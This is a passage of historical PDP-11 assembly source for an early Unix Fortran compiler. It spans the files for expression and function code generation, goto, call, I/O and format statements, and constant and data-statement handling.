	mov	4(r2),r2
	jsr	r5,rvalue
	br	2f
3:
	jsr	r5,rvalue
	mov	(sp),r2
	mov	r3,-(sp)
	mov	4(r2),r2
	jsr	r5,type
	cmp	*2(sp),$4			/ **
	bne	3f
	mov	r3,r2
	bic	$!7,r2
	cmp	r2,$1		/ ** integer
	bne	3f
	mov	2(sp),r2
	sub	$2,(r2)		/ pr -> pi
	mov	4(r2),r2
	jsr	r5,rvalue
	mov	$intcon,r2
	jsr	r5,convrt
	mov	(sp)+,r3
	br	2f
3:
	mov	(sp),r2
	jsr	pc,maxtyp
	mov	(sp)+,r3
	mov	r2,-(sp)
	jsr	r5,convrt
	mov	2(sp),r2
	mov	4(r2),r2
	jsr	r5,rvalue
	mov	(sp)+,r2
	jsr	r5,convrt
	mov	r2,r3
	br	2f
1:
	cmp	(r2),$30.		/ and or not
	bhi	1f
	mov	2(r2),r2
	beq	3f
	jsr	r5,rvalue
	mov	$logcon,r2
	jsr	r5,convrt
3:
	mov	(sp),r2
	mov	4(r2),r2
	jsr	r5,rvalue
	mov	$logcon,r2
	jsr	r5,convrt
2:
	mov	(sp)+,r2
	mov	(r2),r0
	cmp	r0,$4
	bhis	2f
	add	$10.,(r2)		/ back to binary
	tst	r0
	beq	2f
	sub	$8,(r2)		/ back to pr
2:
	mov	optab(r0),r0
	jsr	r5,genop
	jsr	r5,newline
	cmp	(r2),$14.		/ relat
	blo	2f
	mov	$logcon,r3
2:
	rts	r5
1:
	jsr	r5,error; 54.
	mov	(sp)+,r2
	rts	r5

pbit:
	tstb	symtab(r3)
	bge	1f
	jsr	r5,code
		<p\0>
1:
	rts	r5

funcappl:
	mov	r2,-(sp)
	mov	functn,r3
	jsr	r5,code
		<	stsp; ft+%d.\n\0>; .even
		r3
	mov	r3,-(sp)
	add	$2,r3
	mov	r3,functn
	clr	-(sp)		/ nargs
1:
	mov	4(r2),r2
	beq	2f
	inc	(sp)
	cmp	(r2),$36.	/ ,
	bne	1f
	mov	r2,-(sp)
	mov	2(r2),r2
	mov	6(sp),r3
	jsr	r5,fapp1
	mov	(sp)+,r2
	br	1b
1:
	mov	4(sp),r3
	jsr	r5,fapp1
2:
	mov	(sp)+,r0		/ nargs
	mov	(sp)+,r2
	mov	(sp)+,r3
	mov	2(r3),r3
	jsr	r5,code
		<	call\0>; .even
	jsr	r5,pbit
	jsr	r5,code
		<; %n.; ft+%d.; %d.; \0>; .even
		r3
		r2
		r0
	cmp	functn,functm
	ble	1f
	mov	functn,functm
1:
	mov	r2,functn
	rts	r5

fapp1:
	mov	2(r3),r3		/ fetch out function name
	mov	symtab+2(r3),r3		/ arg conversion
	bne	2f
	tst	(r2)
	beq	1f
	cmp	(r2),$32.
	beq	4f
	cmp	(r2),$42.		/ lv if funct or name or arry app
	beq	1f
	cmp	(r2),$2			/ lv if const
	bne	2f
	mov	4(r2),r3
	jsr	r5,code
		<	lval; c%d\n\0>
		r3
	br	3f
2:
	mov	r3,-(sp)
	jsr	r5,rvalue
	mov	(sp)+,r2
	beq	2f
	jsr	r5,convrt
2:
	mov	functn,r3
	jsr	r5,code
		<	stsp; ft+%d.\n\0>; .even
		r3
	add	$2,functn
	rts	r5
1:
	clr	(r2)			/ turn func/array names into lvs
4:
	jsr	r5,lvalue
3:
	mov	functn,r3
	jsr	r5,code
		<	stst; ft+%d.\n\0>; .even
		r3
	add	$2,functn
	rts	r5

aryappl:
	mov	r2,-(sp)
	clr	-(sp)		/ arg count
2:
	inc	(sp)
	mov	4(r2),r2
	cmp	(r2),$36.	/ ,
	bne	2f
	mov	r2,-(sp)
	mov	2(r2),r2
	jsr	r5,rvalue
	mov	$intcon,r2
	jsr	r5,convrt
	mov	(sp)+,r2
	br	2b
2:
	jsr	r5,rvalue
	mov	$intcon,r2
	jsr	r5,convrt
	mov	(sp)+,r0
	mov	(sp)+,r2
	mov	2(r2),r3
	cmp	r0,*symtab+2(r3)
	beq	1f
	jsr	r5,error; 53.		/ dimension mismatch
1:
	rts	r5

/ converts stack from type in r3 to type in r2
convrt:
	mov	r2,-(sp)
	mov	r3,-(sp)
	bic	$![377\<8+7],r2
	bic	$![377\<8+7],r3
	cmp	r2,r3
	beq	1f
	jsr	r5,code
		<	\0>; .even
	jsr	pc,2f
	mov	r2,r3
	jsr	pc,2f
	jsr	r5,code
		<\n\0>; .even
1:
	mov	(sp)+,r3
	mov	(sp)+,r2
	rts	r5
2:
	mov	r2,-(sp)
	mov	r3,r2
	clrb	r3
	swab	r3
	bic	$!7,r2
	movb	typ(r2),r2
	jsr	r5,code
		<%c%d\0>; .even
		r2
		r3
	mov	(sp)+,r2
	rts	pc

type:
	cmp	(r2),$32.
	beq	2f
	cmp	(r2),$34.
	beq	2f
	tst	(r2)
	bne	1f
2:
	mov	2(r2),r3
	mov	symtab(r3),r3
	rts	r5
1:
	cmp	(r2),$2
	bne	1f
	mov	2(r2),r3
	rts	r5
1:
	cmp	(r2),$14.
	blo	1f
	mov	$logcon,r3
	rts	r5
1:
	mov	r2,-(sp)
	mov	2(r2),r2
	bne	1f
	mov	(sp),r2
	mov	4(r2),r2
	jsr	r5,type
	br	2f
1:
	jsr	r5,type
	mov	(sp),r2
	mov	r3,-(sp)
	mov	4(r2),r2
	jsr	r5,type
	mov	(sp)+,r2
	jsr	pc,maxtyp
	mov	r2,r3
2:
	mov	(sp)+,r2
	rts	r5

maxtyp:
	mov	r2,r0
	cmp	r2,r3
	bhis	2f
	mov	r3,r2
2:
	clrb	r2
	bic	$!7,r0
	bic	$!7,r3
	cmp	r0,r3
	bhis	2f
	mov	r3,r0
2:
	bis	r0,r2
	rts	pc

optab:
	<ng>
	<pi>
	<pr>
	<dv>
	<mp>
	<sb>
	<ad>
	<lt>
	<le>
	<eq>
	<ne>
	<gt>
	<ge>
	<nt>
	<an>
	<or>

-- /usr/source/fort/f3/f37.s mode=0100664 uid=3 gid=3 atime=174920891 mtime=174844487 --
/
/

/ f37 -- goto statements of all kinds

.globl	sgoto
.globl	intexp

.globl	e2
.globl	code
.globl	getsym
.globl	error
.globl	getlab
.globl	rvalue
.globl	convrt
.globl	chrtab

sgoto:
	movb	(r1),r0
	cmpb	chrtab(r0),$4		/ test digit
	bne	1f			/ not constant
	jsr	r5,getlab
		br 8f
	jsr	r5,code
		<	goto; .%d\n\0>; .even
		r0
	br	9f
1:
	cmpb	(r1),$'(
	beq	1f
	jsr	r5,intexp
	cmp	r0,$36.			/ ,
	beq	2f
	jsr	r5,code
		<	agoto\n\0>; .even
	br	9f
2:
	jsr	r5,code
		<	cagoto\n\0>; .even
	cmpb	(r1)+,$'(
	bne	8f			/ syntax
	jsr	pc,stmlist
	br	9f
1:
	mov	r1,r4
1:
	movb	(r1)+,r0
	beq	8f
	cmp	r0,$')
	bne	1b
	cmpb	(r1)+,$',
	bne	8f
	jsr	r5,intexp
	mov	r1,-(sp)
	jsr	r5,code
		<	cgoto\n\0>; .even
	mov	r4,r1
	tstb	(r1)+
	jsr	pc,stmlist
	mov	(sp)+,r1
9:
	tstb	(r1)
	beq	1f
8:
	jsr	r5,error; 35.
1:
	rts	r5

stmlist:
	jsr	r5,getlab
		br 9f
	jsr	r5,code
		<	.%d\n\0>; .even
		r0
	movb	(r1)+,r0
	cmp	r0,$',
	beq	stmlist
	cmp	r0,$')
	bne	8f
	jsr	r5,code
		<	0\n\0>; .even
	rts	pc
8:
	jsr	r5,error; 35.
9:
	rts	pc

intexp:
	jsr	r5,e2
	mov	r0,-(sp)
	jsr	r5,rvalue
	mov	$intcon,r2
	jsr	r5,convrt
	mov	(sp)+,r0
	rts	r5

-- /usr/source/fort/f3/f38.s mode=0100664 uid=3 gid=3 atime=174920893 mtime=174844491 --
/
/

/ f38 -- wierdo statements

.globl	sstop
.globl	scall
.globl	spaus
.globl	sretu
.globl	scont
.globl	iserror

.globl	ptemp
.globl	code
.globl	geti
.globl	getsym
.globl	error
.globl	declimpl
.globl	e11
.globl	funcappl

sstop:
	clr	r0
	tstb	(r1)
	beq	1f
	jsr	r5,getsym
	cmp	r0,$2.			/ const
	bne	7f
	cmp	r3,$intcon
	bne	7f
	jsr	r5,geti
1:
	jsr	r5,code
		<	stop; %d\n\0>; .even
		r0
	br	8f

spaus:
	jsr	r5,getsym
	cmp	r0,$2
	bne	7f
	cmp	r3,$intcon
	bne	7f
	jsr	r5,geti
	jsr	r5,code
		<	paus; %d\n\0>; .even
		r0
	br	8f

sretu:
	tst	progt
	bne	1f
	jsr	r5,error;  37.		/ return in main
	br	sstop
1:
	jsr	r5,code
		<	retrn\n\0>; .even
8:
scont:
	tstb	(r1)
	bne	7f
	rts	r5
7:
	jsr	r5,error; 38. 
	rts	r5

iserror:
	cmp	errp,$errb
	bne	1f
	tst	(r5)+
1:
	rts	r5

scall:
	jsr	r5,getsym
	tst	r0
	bne	7b
	bit	$70,symtab(r3)
	bne	1f
	bis	$30,symtab(r3)
1:
	jsr	r5,declimpl
	jsr	r5,e11
	cmp	r0,$40.
	bne	7b
	cmp	(r2),$34.
	beq	1f
	cmp	(r2),$42.
	bne	7b
1:
	jsr	r5,funcappl
	jsr	r5,code
		<0\n\0>; .even
	br	8b

-- /usr/source/fort/f3/f39.s mode=0100664 uid=3 gid=3 atime=174920896 mtime=174844496 --
/
/

/ f39 -- i/o statements

.globl	sread
.globl	swrit
.globl	sprin
.globl	sback
.globl	srewi
.globl	sendf

.globl	getsym
.globl	error
.globl	geticon
.globl	e2
.globl	lvalue
.globl	rvalue
.globl	iserror
.globl	convrt
.globl	code
.globl	chrtab
.globl	blocks
.globl	blockp
.globl	doend
.globl	genop
.globl	levzer
.globl	dobeg
.globl	intexp
.globl	ptemp
.globl	blocks
.globl	blockp
.globl	intexp
.globl	newline
.globl	nelem

sprin:
	mov	$8.,-(sp)
	jsr	r5,getfmt
		br 9f
	cmp	r0,$36.			/ ,
	beq	1f
	cmp	r0,$40.			/ =|
	bne	8f
	clrb	(r1)
1:
	mov	$34.,r0			/ simulate )
	br	2f

sread:
	mov	$2,-(sp)
	br	1f

swrit:
	clr	-(sp)

1:
	cmpb	(r1)+,$'(
	bne	8f
	jsr	r5,intexp
	mov	$blocks,blockp
	cmp	r0,$34.			/ ), implies unformatted
	beq	2f
	cmp	r0,$36.			/ ,
	bne	8f
	jsr	r5,getfmt
		br 9f
	add	$4,(sp)
	cmp	r0,$34.			/ )
	bne	8f
2:
	mov	(sp),r0
	mov	iotype(r0),r0
	jsr	r5,code
		<	%s\n\0>; .even
		r0
1:
	tstb	(r1)
	beq	9f
1:
	jsr	r5,list
	cmp	r0,$40.			/ |=
	beq	9f
8:
	jsr	r5,error; 41.
9:
	jsr	r5,code
		<	endio\n\0>; .even
	tst	(sp)+
	rts	r5

iotype:
	1f
	2f
	3f
	4f
	5f

1:
	<iowu\0>
2:
	<ioru\0>
3:
	<iowf\0>
4:
	<iorf\0>
5:
	<iowp\0>
	.even

getfmt:
	movb	(r1),r0
	cmpb	chrtab(r0),$4		/ digit
	beq	1f
	jsr	r5,e2
	jsr	r5,iserror
		rts r5
	mov	r0,-(sp)
	jsr	r5,lvalue
	mov	$blocks,blockp
	br	8f
1:
	jsr	r5,geticon
		br 8f
	mov	r0,temp
	jsr	r5,ptemp; 'i; temp; line	/ register use of format
	jsr	r5,code
		<	lval; .%d\n\0>; .even
		r0
	jsr	r5,getsym
	mov	r0,-(sp)
8:
	mov	(sp)+,r0
	tst	(r5)+
	rts	r5

list:
	jsr	r5,lstitm
	cmp	r0,$36.			/ ,
	beq	list
	rts	r5

lstitm:
	mov	$blocks,blockp
	cmpb	(r1),$'(		/ test for sublist
	beq	1f
	jsr	r5,e2
	jsr	r5,iserror
		rts r5
	mov	r0,-(sp)
	clr	-(sp)
	tst	(r2)
	bne	2f			/ test for name
	mov	2(r2),r3
	mov	symtab(r3),r0
	bic	$!70,r0
	cmp	r0,$20			/ test for short list
	bne	2f
	mov	pc,(sp)
	mov	symtab+2(r3),r3
	mov	(r3)+,-(sp)
	asl	(sp)
	add	(sp)+,r3
	mov	(r3),r3
	jsr	r5,code
		<	slist1; d%d\n2:\0>; .even
		r3
2:
	jsr	r5,lvalue
	tst	(sp)
	beq	3f
	jsr	r5,code
		<	slist3\n\0>; .even
3:
	mov	$"io,r0
	jsr	r5,genop
	tst	(sp)+
	beq	2f
	jsr	r5,code
		<\n	slist2; 2b\0>; .even
2:
	jsr	r5,newline
	mov	(sp)+,r0
	rts	r5
1:
	inc	r1
	jsr	r5,levzer; '=
		br  1f			/ yes, implied do
	jsr	r5,list
	jsr	r5,chkel
	jsr	r5,getsym
	rts	r5
1:
	cmp	r1,r0
	bhis	8f
	cmpb	-(r0),$',		/ look backwards
	bne	1b
	mov	r0,-(sp)
	mov	r1,-(sp)
	movb	$'),(r0)		/ fake!!
	mov	r0,r1
	inc	r1
	clr	r0
	jsr	r5,dobeg		/ get do
	jsr	r5,chkel
	mov	(sp)+,r0
	mov	r1,-(sp)
	mov	r0,r1
	jsr	r5,list
	jsr	r5,chkel
	clr	r0
	jsr	r5,doend
	mov	(sp)+,r1
	movb	$',,*(sp)+		/ unfake!!
	jsr	r5,getsym
	rts	r5

chkel:
	cmp	r0,$34.			/ )
	beq	1f
8:
	jsr	r5,error; 41.
1:
	rts	r5

sback:
	mov	$bksp,r2
	br	1f

srewi:
	mov	$rewi,r2
	br	1f

sendf:
	mov	$enfl,r2

1:
	mov	r2,-(sp)
	jsr	r5,intexp
	mov	(sp),r2
	jsr	r5,code
		<	%s\n\0>; .even
		r2
	cmp	r0,$40.			/ =|
	beq	9f
8:
	jsr	r5,error; 41.
9:
	tst	(sp)+
	rts	r5

bksp:
	<bksp\0>
rewi:
	<rewi\0>
enfl:
	<enfl\0>

-- /usr/source/fort/f4 mode=0140775 uid=3 gid=3 atime=174930095 mtime=174920928 --
-- /usr/source/fort/f4/f41.s mode=0100664 uid=3 gid=3 atime=174920904 mtime=174844520 --
/
/

/ f41 -- everything else

.globl	pass4

.globl	signon
.globl	flush
.globl	dope
.globl	formts
.globl	globls
.globl	constn
.globl	fopen
.globl	bsss
.globl	tfil2

pass4:
	setd
	jsr	r5,signon; 4
	mov	ibuf,r0
	sys	close
	jsr	r5,flush; obuf
	jsr	r5,flush; tbuf

	jsr	r5,dope
	jsr	r5,formts
	jsr	r5,constn
	jsr	r5,bsss
	jsr	r5,globls		/ uses r4 from bsss
	jsr	r5,flush; obuf
	sys	unlink; tfil2
	clr	r0
	tst	nerror
	beq	1f
	sys	seek; 0; 2
	mov	$1,r0		/ syntax errors
1:
	sys	exit

-- /usr/source/fort/f4/f42.s mode=0100664 uid=3 gid=3 atime=174920907 mtime=174844525 --
/
/

/ 42 -- definition

.globl	bsss

.globl	code
.globl	size
.globl	declimpl
.globl	cdata
.globl	dodata
.globl	dattab

bsss:
	jsr	r5,cdata
	cmp	progt,$6		/ test block common
	bne	1f
	rts	r5
1:
	jsr	r5,code
		<.bss\n\0>; .even
	mov	functm,r3
	beq	1f
	jsr	r5,code
		<ft:	.=.+%d.\n\0>; .even
		r3
1:
	cmp	r4,$dattab			/ any data?
	beq	1f
	jsr	r5,code
		<.data\n\0>; .even
1:
	jsr	r5,code
		<base:\n\0>; .even
	clr	r3
1:
	cmp	r3,symtp
	bhis	pass2
	bit	$70,symtab(r3)			/ test classed
	bne	2f
	jsr	r5,declimpl
2:
	mov	symtab(r3),r0
	mov	symtab+6(r3),r2
	bic	$!70,r0			/ class
	cmp	r0,$10			/ simple
	beq	1f
	cmp	r0,$20			/ array
	beq	1f
	cmp	r0,$30			/ extrn
	bne	2f
	bit	$200,symtab(r3)		/ param
	beq	2f
	jsr	r5,code
		<%n.	= %d.\n\0>; .even
		r3
		r2
2:
	cmp	r0,$40			/ common block
	bne	2f
	mov	symtab+6(r3),r2		/ size
	beq	2f
	jsr	r5,code
		<.comm	%n,%d.\n\0>; .even
		r3
		r2
2:
	add	$8,r3
	br	1b

1:
	bit	$300,symtab(r3)
	beq	1f
	jsr	r5,code
		<%n_	= %d.\n\0>; .even
		r3
		r2
	br	2b
1:
	tst	r2
	bne	1f
	jsr	r5,size
	mov	nxtaloc,r2
	mov	r2,symtab+6(r3)
	add	r0,nxtaloc
1:
	jsr	r5,code
		<%n_ = base+%d.\n\0>; .even
		r3
		r2
	br	2b

pass2:
	jsr	r5,dodata
	rts	r5

-- /usr/source/fort/f4/f43.s mode=0100664 uid=3 gid=3 atime=174920909 mtime=174844529 --
/
/

/ f43 -- output globals and bdata bss's

.globl	globls

.globl	code
.globl	dattab
.globl	onedata
.globl	error
.globl	perror

globls:
	mov	progt,r0
	jmp	*1f(r0)
1:
	1f
	2f
	3f
	4f
1:
	jsr	r5,code
		<.globl	main\n\0>; .even
	rts	r5
2:
3:
	jsr	r5,code
		<.globl	%n.\n\0>; .even
		8
	rts	r5
4:
1:
	clr	r3
1:
	cmp	r3,symtp
	blo	2f
	rts	r5
2:
	mov	symtab(r3),r0
	bic	$!270,r0
	cmp	r0,$40			/ common block
	bne	2f
	mov	symtab+6(r3),r2
	beq	2f
	mov	$dattab,r1
3:
	cmp	r1,r4
	bhis	3f
	cmp	(r1),r3
	beq	4f
	add	$8.,r1
	br	3b
3:
	jsr	r5,code
		<.bss\n.globl	%n\n%n:	.=.+%d.\n.text\n\0>; .even
		r3
		r3
		r2
	br	2f
4:
	jsr	r5,code
		<.data\n.globl	%n\n%n:\n\0>; .even
		r3
		r3
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r1,r3
	jsr	r5,onedata
	mov	(sp)+,r3
	mov	(sp)+,r2
	sub	r1,r2
	bge	9f
	jsr	r5,error; 22.		/ data overrun
	jsr	r5,perror
9:
	jsr	r5,code
		<.=.+%d.\n.text\n\0>; .even
	r2
2:
	add	$8,r3
	br	1b

-- /usr/source/fort/f4/f44.s mode=0100664 uid=3 gid=3 atime=174920912 mtime=174844534 --
/
/

/ f44 -- formats

.globl	formts
.globl	strout

.globl	setln
.globl	getln
.globl	code
.globl	error
.globl	perror
.globl	putc
.globl	xbuf

formts:
	jsr	r5,setln
	mov	$2,r3
	clr	xbuf+518.		/ pick up zero efn formats
1:
	jsr	r5,getln
		br 1f
	cmp	r0,$'s
	beq	2f
	cmp	r0,$'f
	bne	1b
	mov	efno,r0
	jsr	r5,code
		<.%d:	<\0>; .even
		r0
	mov	$line+6,r1
	jsr	r5,strout
	mov	efno,r0
	neg	r0
	br	3f
2:
	mov	efno,r0
3:
	clr	r2
2:
	cmp	r2,r3
	bhis	2f
	cmp	r0,xbuf+518.(r2)
	beq	3f
	neg	r0
	cmp	r0,xbuf+518.(r2)
	beq	3f
	add	$2,r2
	neg	r0
	br	2b
3:
	jsr	r5,error; 51.
	jsr	r5,perror
2:
	mov	r0,xbuf+518.(r3)
	add	$2,r3
	br	1b
1:
	jsr	r5,code
		<	.even\n>; .even
	jsr	r5,setln
1:
	jsr	r5,getln
		br 1f
	cmp	r0,$'r
	beq	2f
	cmp	r0,$'i
	bne	1b
	mov	efno,r0
	neg	r0
	br	3f
2:
	mov	efno,r0
3:
	mov	$2,r2			/ not zero
2:
	cmp	r2,r3
	bhis	2f
	cmp	r0,xbuf+518.(r2)
	beq	1b
	add	$2,r2
	br	2b
2:
	jsr	r5,error; 52.
	jsr	r5,perror
	br	1b
1:
	rts	r5

strout:
	movb	(r1)+,r0
	beq	3f
	cmp	r0,$'>
	beq	4f
	cmp	r0,$'\\
	bne	5f
4:
	mov	r0,-(sp)
	mov	$'\\,r0
	jsr	r5,putc; obuf
	mov	(sp)+,r0
5:
	jsr	r5,putc; obuf
	br	strout
3:
	jsr	r5,code
		<\\0\>\n\0>; .even
	rts	r5

-- /usr/source/fort/f4/f45.s mode=0100664 uid=3 gid=3 atime=174920914 mtime=174844538 --
/
/

/ f45 -- constant pool

.globl	constn
.globl	evalcon

.globl	error
.globl	perror
.globl	code
.globl	getcon
.globl	setln
.globl	getln
.globl	xbuf
.globl	symbuf
.globl	negflg

constn:
	jsr	r5,setln
	mov	$xbuf+518.,r3		/ pool max pointer
	mov	$ibuf+518.,r4		/ pool pointer pointer
1:
	jsr	r5,getln
		br 1f
	cmp	r0,$'c
	bne	1b
	jsr	r5,packcon
	mov	r2,-(r4)		/ put p ptr in p p ptr
	cmp	r3,r4
	blo	1b
	jsr	r5,error; 99.
	jsr	r5,perror
1:
	mov	$xbuf+518.,r2
1:
	cmp	r2,r3
	bhis	1f
	mov	$ibuf+518.,r1
2:
	cmp	r1,r4
	blo	2f
	cmp	-(r1),r2
	bne	2b
	mov	r1,r0
	sub	$ibuf+516.,r0
	asr	r0
	neg	r0
	jsr	r5,code
		<c%d:\n\0>; .even
		r0
	br	2b
2:
	mov	(r2)+,r0
	jsr	r5,code
		<	%o\n\0>; .even
		r0
	br	1b
1:
	rts	r5

packcon:
	mov	$line,r1
	jsr	r5,evalcon
	mov	r1,-(sp)
	mov	r3,-(sp)
	sub	r2,(sp)
	asr	(sp)
	mov	r2,-(sp)
	mov	$xbuf+518.,r2
1:
	mov	(sp),r3
	mov	r2,r1
	tst	(r2)+
	mov	2(sp),r0
2:
	cmp	(r1)+,(r3)+
	bne	1b
	dec	r0
	bgt	2b
	tst	-(r2)
	mov	(sp)+,r3
	asl	(sp)
	add	r2,(sp)
	cmp	(sp),r3
	blos	1f
	mov	(sp),r3			/ eureka
1:
	tst	(sp)+
	mov	(sp)+,r1
	rts	r5

evalcon:
	cmpb	efno,$5
	bne	2f
	movb	efno+1,r0
	mov	r3,r2
	br	1f
2:
	jsr	r5,getcon
	tst	negflg
	beq	2f
	negf	fr0
	negf	fr1
2:
	mov	r3,r2
	mov	efno,r0
	mov	r0,r1
	clrb	r0
	swab	r0
	bic	$!7,r1
	cmpb	r1,$realcon
	beq	3f
	cmpb	r1,$cplxcon
	beq	2f
	setl
	movfi	r0,symbuf+1
	seti
	mov	$symbuf+5,r1
	sub	r0,r1
	br	1f
2:
	mov	$symbuf+1,r1
	movf	fr1,symbuf+1
	cmp	r0,$8
	beq	2f
	movf	fr0,symbuf+9.
	br	1f
2:
	movf	fr0,symbuf+5
	br	1f
3:
	movf	fr0,symbuf+1
	mov	$symbuf+1,r1
1:
	movb	(r1)+,(r3)+
	dec	r0
	bgt	1b
	bit	$1,r3
	beq	1f
	clrb	(r3)+
1:
	rts	r5

-- /usr/source/fort/f4/f46.s mode=0100664 uid=3 gid=3 atime=174920917 mtime=174844542 --
/
/

/ f46 -- constant evaluation

.globl	getcon
.globl	dope

.globl	code

getcon:
	mov	r0,-(sp)
	mov	r2,-(sp)
	clr	r2			/ dec . counter
	clrf	fr0
	movif	$10.,fr1
	clr	-(sp)			/ - flag
	cmpb	(r1)+,$'+
	beq	1f
	cmpb	-(r1),$'-
	bne	1f
	inc	r1
	inc	(sp)
1:
	movb	(r1)+,r0
	sub	$'0,r0
	cmp	r0,$9
	blos	2f
	cmp	r0,$'.-'0
	bne	1f
	dec	r2
	br	1b
2:
	tst	r2
	beq	2f
	dec	r2
2:
	mulf	fr1,fr0
	movif	r0,fr2
	addf	fr2,fr0
	br	1b
1:
	tst	r2
	bne	1f
	dec	r2
1:
	cmp	r0,$'e-'0
	beq	2f
	cmp	r0,$'d-'0
	bne	1f
2:
	mov	r3,-(sp)
	clr	r3
	clr	-(sp)
	cmpb	(r1),$'-
	bne	3f
	inc	r1
	inc	(sp)
	br	2f
3:
	cmpb	(r1),$'+
	bne	2f
	inc	r1
2:
	movb	(r1)+,r0
	sub	$'0,r0
	cmp	r0,$9
	bhi	2f
	mpy	$10.,r3
	add	r0,r3
	br	2b
2:
	tst	(sp)+
	beq	2f
	neg	r3
2:
	add	r3,r2
	mov	(sp)+,r3
1:
	movf	fr1,fr2
	add	$1,r2
	beq	1f
	blt	2f
	clr	-(sp)
	br	3f
2:
	mov	pc,-(sp)
	neg	r2
3:
	sub	$1,r2
	ble	2f
	mulf	fr1,fr2
	br	3b
2:
	tst	(sp)+
	bne	2f
	mulf	fr2,fr0
	br	1f
2:
	divf	fr2,fr0
1:
	tst	(sp)+
	beq	1f
	negf	fr0
1:
	cmpb	-(r1),$',
	bne	1f
	movf	fr0,-(sp)
	inc	r1
	jsr	r5,getcon
	movf	(sp)+,fr1		/ a,b -> r1,r0
1:
	mov	(sp)+,r2
	mov	(sp)+,r0
	rts	r5

dope:
	cmp	progt,$6		/ test "block data"
	bne	1f
	rts	r5
1:
	clr	r3
1:
	cmp	r3,symtp
	bhis	1f
	mov	symtab(r3),r0
	bic	$!70,r0
	cmp	r0,$20
	bne	2f
	mov	symtab+2(r3),r0
	beq	2f
	mov	(r0)+,r1
	mov	r1,r2
	asl	r2
	add	r0,r2
	mov	(r2),r0
	jsr	r5,code
		<d%d:	%d.\n	\0>; .even
		r0
		r1
3:
	dec	r1
	blt	3f
	mov	-(r2),r0
	bge	4f
	jsr	r5,code
		<..; \0>; .even
	br	3b
4:
	jsr	r5,code
		<%d.; \0>; .even
		r0
	br	3b
3:
	mov	symtab(r3),r2
	clrb	r2
	swab	r2
	jsr	r5,code
		<%d.\n\0>; .even
		r2
2:
	add	$8,r3
	br	1b
1:
	rts	r5

-- /usr/source/fort/f4/f47.s mode=0100664 uid=3 gid=3 atime=174920920 mtime=174844546 --
/
/

/ f47 -- analysis of data statements

.globl	cdata
.globl	dodata
.globl	onedata
.globl	compare

.globl	code
.globl	getcon
.globl	error
.globl	getsym
.globl	consub
.globl	size
.globl	geti
.globl	setln
.globl	getln
.globl	declimpl
.globl	evalcon
.globl	dattab
.globl	contab
.globl	efno
.globl	perror
.globl	qsort
.globl	negflg
.globl	repfact
.globl	geti
.globl	holround

cdata:
	mov	r5,-(sp)
	jsr	r5,setln
	mov	$dattab,r4
	mov	$contab,r5
dloop:
	jsr	r5,getln
		br 2f
	br	1f
2:
	mov	r4,-(sp)
	mov	$dattab,r1
	mov	r4,r2
	mov	$8.,r3
	jsr	pc,qsort
	mov	(sp)+,r4
	mov	(sp)+,r5
	rts	r5
1:
	cmp	r0,$'d
	bne	dloop
	mov	$line+4,r1
/ loop per specification-set
1:
	clr	repfact
	mov	r1,r2
2:
	jsr	r5,getsym
	cmp	r0,$40.		/ =|
	bne	3f
8:
	jmp	8f
9:
	jmp	9f
3:
	cmp	r0,$6		/ /
	bne	2b
	mov	r1,-(sp)
	mov	r2,r1
	mov	(sp)+,r2
/ loop per specification
2:
	cmp	r4,r5
	blo	3f
	jmp	7f
3:
	jsr	r5,getsym
	tst	r0
	bne	8b
	bit	$70,symtab(r3)		/ test classed
	bne	3f
	jsr	r5,declimpl
3:
	mov	symtab(r3),r0
	mov	r0,holquo		/ temp storage
	incb	holquo+1		/ round size
	bicb	$1,holquo+1
	bit	$200,r0			/ test parameter
	bne	9b
	bic	$!70,r0
	cmp	r0,$10			/ simple
	beq	3f
	cmp	r0,$20			/ array
	bne	9b
3:
	bit	$100,symtab(r3)		/ test common
	beq	3f
	cmp	progt,$6		/ test block data
	bne	9b
	mov	symtab+4(r3),(r4)+	/ common block
	br	4f
3:
	cmp	progt,$6		/ test block data
	beq	9b
	clr	(r4)+
	tst	symtab+6(r3)		/ test allocated
	bne	4f
	mov	nxtaloc,symtab+6(r3)
	jsr	r5,size
	add	r0,nxtaloc
4:
	clr	(r4)			/ offset slot
	cmpb	(r1),$'(		/ test subscript
	bne	3f
	inc	r1
	jsr	r5,consub
	bic	$70,holquo
	bis	$10,holquo	/ array -> scalar
	mov	r0,(r4)
3:
	movb	symtab+1(r3),r0	/ width of item
	inc	r0
	bic	$1,r0
	mov	r0,holround
	add	symtab+6(r3),(r4)+
	tst	repfact
	beq	3f
	dec	repfact
	movb	efno+1,r3
	mov	r3,(r4)+
	mov	r5,(r4)+
	br	4f
3:
	mov	r1,-(sp)
	mov	r2,r1
	mov	(sp)+,r2
5:
	jsr	r5,getsym
	cmp	r0,$2			/ constant
	beq	3f
	cmp	r0,$10.			/ -
	bne	8f
	inc	negflg
	jsr	r5,getsym
	cmp	r0,$2			/ constant
	bne	8f
3:
	cmpb	(r1)+,$'*
	bne	3f
	cmp	r3,$intcon
	bne	8f
	jsr	r5,geti
	dec	r0
	bmi	8f
	mov	r0,repfact
	br	5b
3:
	dec	r1
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,efno
	clrb	r3
	swab	r3
	mov	r3,(r4)+
	sub	r3,r5
	mov	r5,(r4)+		/ ptr to const
	mov	r5,r3
	mov	$symbuf,r1
	jsr	r5,evalcon
	clr	negflg
	mov	(sp)+,r1
	mov	(sp)+,r2		/ note r1 <=> r2
4:
	cmpb	efno+1,holquo+1		/ compare sizes
	blt	9f			/ constant too small
	beq	3f
	bicb	$!77,holquo
	cmp	holquo,$int2con+10	/ simple int*2?
	bne	4f
	sub	$2,-4(r4)		/ reduce const length
	cmpb	efno,$5
	beq	3f			/ hollerith, OK
	add	$2,-2(r4)		/ get least sig.
	br	3f
4:
	bit	$20,holquo		/ test array
	beq	9f
	cmpb	efno,$5			/ test hollerith
	bne	9f
3:
	cmpb	(r1),$'/
	beq	3f
	cmpb	(r1)+,$',
	bne	8f
	tst	repfact
	bne	4f
	cmpb	(r2)+,$',
	bne	8f
4:
	jmp	2b
3:
	cmpb	(r2)+,$'/
	bne	8f
	tstb	(r2)
	beq	1f
	cmpb	(r2),$',
	bne	3f
	inc	r2
3:
	mov	r2,r1
	tst	repfact
	bne	8f
	jmp	1b
7:
	jsr	r5,error; 28.		/ data table overflow
	br	2f
8:
	jsr	r5,error; 21.		/ data syntax error
	br	2f
9:
	jsr	r5,error; 22.		/ data semantic error
2:
	mov	$dattab,r4		/ reset ptrs
	mov	$contab,r5
	jsr	r5,perror
1:
	jmp	dloop

dodata:
	cmp	progt,$6
	beq	1f			/ block data
	mov	$dattab,r3
